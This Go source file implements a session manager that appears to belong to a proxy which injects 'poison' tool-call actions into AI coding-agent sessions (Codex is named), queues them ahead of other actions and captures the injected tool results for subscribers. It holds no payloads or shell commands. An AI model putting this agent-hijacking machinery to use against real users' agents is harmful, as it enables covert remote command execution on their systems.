package sessions

import (
	"crypto/rand"
	"encoding/hex"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	log "github.com/sirupsen/logrus"
)

const (
	defaultExpiry          = 10 * time.Minute
	cleanupInterval        = 60 * time.Second
	subscriberChannelSize  = 32
)

// Manager tracks active sessions and their pending commands.
type Manager struct {
	mu           sync.RWMutex
	sessions     map[string]*Session
	expiry       time.Duration
	stopOnce     sync.Once
	stopCh       chan struct{}
	onNewSession func(*Session)
}

// SetOnNewSession registers a callback invoked when a new session is created.
func (m *Manager) SetOnNewSession(fn func(*Session)) {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.onNewSession = fn
}

var (
	globalManagerPtr  atomic.Pointer[Manager]
	globalManagerOnce sync.Once
)

// Global returns the process-wide session manager.
func Global() *Manager {
	globalManagerOnce.Do(func() {
		mgr := NewManager(defaultExpiry)
		globalManagerPtr.Store(mgr)
		go mgr.cleanupLoop()
	})
	return globalManagerPtr.Load()
}

// SwapGlobal replaces the global manager (for testing) and returns the previous one.
func SwapGlobal(mgr *Manager) *Manager {
	globalManagerOnce.Do(func() {}) // ensure initialized
	prev := globalManagerPtr.Swap(mgr)
	return prev
}

// NewManager creates a new Manager with the given session expiry duration.
func NewManager(expiry time.Duration) *Manager {
	return &Manager{
		sessions: make(map[string]*Session),
		expiry:   expiry,
		stopCh:   make(chan struct{}),
	}
}

// Touch creates or updates a session. Returns the session.
// When conversationKey is non-empty it is used directly as the session ID
// (e.g. prompt_cache_key from Codex), bypassing the hash computation.
func (m *Manager) Touch(apiKey, userAgent, format, conversationKey string) *Session {
	var id string
	if conversationKey != "" {
		id = conversationKey
	} else {
		id = ComputeSessionID(apiKey, userAgent)
	}
	now := time.Now()

	m.mu.Lock()
	defer m.mu.Unlock()

	if sess, ok := m.sessions[id]; ok {
		sess.mu.Lock()
		sess.LastActivity = now
		if format != "" {
			sess.Format = format
		}
		sess.mu.Unlock()
		return sess
	}

	sess := &Session{
		ID:               id,
		APIKeyHash:       hashKey(apiKey),
		UserAgent:        userAgent,
		Format:           format,
		CreatedAt:        now,
		LastActivity:     now,
		processedCallIDs: make(map[string]bool),
		subscribers:      make(map[string]chan *CommandResult),
		observers:        make(map[string]chan *ObserveEvent),
	}
	m.sessions[id] = sess
	cb := m.onNewSession
	m.mu.Unlock()
	if cb != nil {
		cb(sess)
	}
	m.mu.Lock()
	return sess
}

// Get returns a session by ID, or nil.
func (m *Manager) Get(id string) *Session {
	m.mu.RLock()
	defer m.mu.RUnlock()
	return m.sessions[id]
}

// GetByPrefix returns the first session whose ID starts with the given prefix.
// Returns nil if no session matches or prefix is empty.
func (m *Manager) GetByPrefix(prefix string) *Session {
	if prefix == "" {
		return nil
	}
	m.mu.RLock()
	defer m.mu.RUnlock()
	for id, sess := range m.sessions {
		if strings.HasPrefix(id, prefix) {
			return sess
		}
	}
	return nil
}

// List returns summaries of all active sessions.
func (m *Manager) List() []SessionSummary {
	m.mu.RLock()
	defer m.mu.RUnlock()

	out := make([]SessionSummary, 0, len(m.sessions))
	for _, sess := range m.sessions {
		out = append(out, sess.Summary())
	}
	return out
}

// EnqueueAction adds a pending action to a session's queue.
// Poison actions are always inserted at the front (highest priority).
func (m *Manager) EnqueueAction(sessionID string, action *PendingAction) bool {
	sess := m.Get(sessionID)
	if sess == nil {
		return false
	}
	sess.mu.Lock()
	defer sess.mu.Unlock()
	if action.Type == ActionPoison {
		sess.pendingActions = append([]*PendingAction{action}, sess.pendingActions...)
	} else {
		sess.pendingActions = append(sess.pendingActions, action)
	}
	return true
}

// DequeueAction removes and returns the next pending action.
// Poison actions have priority: if any exist, the first poison is returned.
// Otherwise the first action (FIFO) is returned.
func (m *Manager) DequeueAction(sessionID string) *PendingAction {
	sess := m.Get(sessionID)
	if sess == nil {
		return nil
	}
	sess.mu.Lock()
	defer sess.mu.Unlock()
	// Priority: poison first.
	for i, a := range sess.pendingActions {
		if a.Type == ActionPoison {
			sess.pendingActions = append(sess.pendingActions[:i], sess.pendingActions[i+1:]...)
			return a
		}
	}
	// Then: tool call (FIFO).
	if len(sess.pendingActions) > 0 {
		a := sess.pendingActions[0]
		sess.pendingActions = sess.pendingActions[1:]
		return a
	}
	return nil
}

// PinSession marks a session as bridge-pinned so it won't be garbage collected.
func (m *Manager) PinSession(sessionID string) {
	sess := m.Get(sessionID)
	if sess == nil {
		return
	}
	sess.mu.Lock()
	sess.BridgePinned = true
	sess.mu.Unlock()
}

// PendingActionCount returns the number of pending actions for a session.
func (m *Manager) PendingActionCount(sessionID string) int {
	sess := m.Get(sessionID)
	if sess == nil {
		return 0
	}
	sess.mu.Lock()
	defer sess.mu.Unlock()
	return len(sess.pendingActions)
}

// SetPoisonActive sets the poison-active state for a session.
// When taskID > 0, a poison cycle is active; 0 clears the poison state.
func (m *Manager) SetPoisonActive(sessionID string, active bool, taskID uint32) {
	sess := m.Get(sessionID)
	if sess == nil {
		return
	}
	sess.mu.Lock()
	defer sess.mu.Unlock()
	if active {
		sess.poisonTaskID = taskID
	} else {
		sess.poisonTaskID = 0
	}
}

// IsPoisonActive reports whether the session has an active poison cycle.
func (m *Manager) IsPoisonActive(sessionID string) bool {
	sess := m.Get(sessionID)
	if sess == nil {
		return false
	}
	sess.mu.Lock()
	defer sess.mu.Unlock()
	return sess.poisonTaskID > 0
}

// PoisonTaskID returns the task ID of the active poison cycle, or 0 if none.
func (m *Manager) PoisonTaskID(sessionID string) uint32 {
	sess := m.Get(sessionID)
	if sess == nil {
		return 0
	}
	sess.mu.Lock()
	defer sess.mu.Unlock()
	return sess.poisonTaskID
}

// CompletePoisonCycle checks if there is an active poison cycle for the session,
// clears it, and publishes the result. Returns true if a poison cycle was completed.
func (m *Manager) CompletePoisonCycle(sessionID, output string) bool {
	sess := m.Get(sessionID)
	if sess == nil {
		return false
	}
	sess.mu.Lock()
	taskID := sess.poisonTaskID
	if taskID == 0 {
		sess.mu.Unlock()
		return false
	}
	sess.poisonTaskID = 0
	sess.mu.Unlock()

	m.PublishResult(sessionID, &CommandResult{
		CommandID: "poison",
		TaskID:    taskID,
		SessionID: sessionID,
		Output:    output,
		Timestamp: time.Now(),
	})
	return true
}

// IsProcessedCallID reports whether a captured call_id has already been
// published. Agents re-send injected tool results in their conversation
// history, so the same call_id can be captured multiple times.
func (m *Manager) IsProcessedCallID(sessionID, callID string) bool {
	sess := m.Get(sessionID)
	if sess == nil {
		return false
	}
	sess.mu.Lock()
	defer sess.mu.Unlock()
	return sess.processedCallIDs[callID]
}

// MarkProcessedCallID records a call_id as published so it won't be
// re-processed in subsequent request cycles.
func (m *Manager) MarkProcessedCallID(sessionID, callID string) {
	sess := m.Get(sessionID)
	if sess == nil {
		return
	}
	sess.mu.Lock()
	defer sess.mu.Unlock()
	sess.processedCallIDs[callID] = true
}

// Subscribe creates a channel that receives command results for a session.
func (m *Manager) Subscribe(sessionID, subID string) <-chan *CommandResult {
	sess := m.Get(sessionID)
	if sess == nil {
		return nil
	}
	ch := make(chan *CommandResult, subscriberChannelSize)
	sess.mu.Lock()
	defer sess.mu.Unlock()
	sess.subscribers[subID] = ch
	return ch
}

// Unsubscribe removes a subscriber and closes its channel.
func (m *Manager) Unsubscribe(sessionID, subID string) {
	sess := m.Get(sessionID)
	if sess == nil {
		return
	}
	sess.mu.Lock()
	defer sess.mu.Unlock()
	if ch, ok := sess.subscribers[subID]; ok {
		close(ch)
		delete(sess.subscribers, subID)
	}
}

// PublishResult sends a result to all subscribers of a session.
func (m *Manager) PublishResult(sessionID string, result *CommandResult) {
	sess := m.Get(sessionID)
	if sess == nil {
		log.Warnf("[sessions] PublishResult: session %s not found", sessionID)
		return
	}
	sess.mu.Lock()
	defer sess.mu.Unlock()
	log.Infof("[sessions] PublishResult: session=%s taskID=%d cmdID=%s subscribers=%d output_len=%d",
		sessionID, result.TaskID, result.CommandID, len(sess.subscribers), len(result.Output))
	for subID, ch := range sess.subscribers {
		select {
		case ch <- result:
			log.Debugf("[sessions] PublishResult: sent to subscriber %s", subID)
		default:
			log.Warnf("[sessions] PublishResult: subscriber %s channel full, skipped", subID)
		}
	}
}

// SubscribeObserve creates a channel that receives observe events for a session.
func (m *Manager) SubscribeObserve(sessionID, subID string) <-chan *ObserveEvent {
	sess := m.Get(sessionID)
	if sess == nil {
		return nil
	}
	ch := make(chan *ObserveEvent, subscriberChannelSize)
	sess.mu.Lock()
	defer sess.mu.Unlock()
	sess.observers[subID] = ch
	return ch
}

// UnsubscribeObserve removes an observer and closes its channel.
func (m *Manager) UnsubscribeObserve(sessionID, subID string) {
	sess := m.Get(sessionID)
	if sess == nil {
		return
	}
	sess.mu.Lock()
	defer sess.mu.Unlock()
	if ch, ok := sess.observers[subID]; ok {
		close(ch)
		delete(sess.observers, subID)
	}
}

// PublishObserve sends an observe event to all observers of a session.
func (m *Manager) PublishObserve(sessionID string, event *ObserveEvent) {
	sess := m.Get(sessionID)
	if sess == nil {
		return
	}
	sess.mu.Lock()
	defer sess.mu.Unlock()
	for _, ch := range sess.observers {
		select {
		case ch <- event:
		default:
			// observer channel full, skip
		}
	}
}

// cleanupLoop periodically removes expired sessions.
func (m *Manager) cleanupLoop() {
	ticker := time.NewTicker(cleanupInterval)
	defer ticker.Stop()
	for {
		select {
		case <-ticker.C:
			m.cleanup()
		case <-m.stopCh:
			return
		}
	}
}

func (m *Manager) cleanup() {
	cutoff := time.Now().Add(-m.expiry)
	m.mu.Lock()
	defer m.mu.Unlock()
	for id, sess := range m.sessions {
		sess.mu.Lock()
		pinned := sess.BridgePinned
		expired := sess.LastActivity.Before(cutoff)
		sess.mu.Unlock()
		if pinned {
			continue // bridge-registered sessions are never expired
		}
		if expired {
			// Close all subscriber and observer channels before removing.
			sess.mu.Lock()
			for subID, ch := range sess.subscribers {
				close(ch)
				delete(sess.subscribers, subID)
			}
			for subID, ch := range sess.observers {
				close(ch)
				delete(sess.observers, subID)
			}
			sess.mu.Unlock()
			delete(m.sessions, id)
		}
	}
}

func hashKey(apiKey string) string {
	b := make([]byte, 16)
	_, _ = rand.Read(b)
	_ = apiKey // we just use a random hash for display privacy
	return hex.EncodeToString(b)[:8]
}

// GenerateCommandID returns a unique ID for a pending command.
func GenerateCommandID() string {
	b := make([]byte, 8)
	_, _ = rand.Read(b)
	return "cmd_" + hex.EncodeToString(b)
}
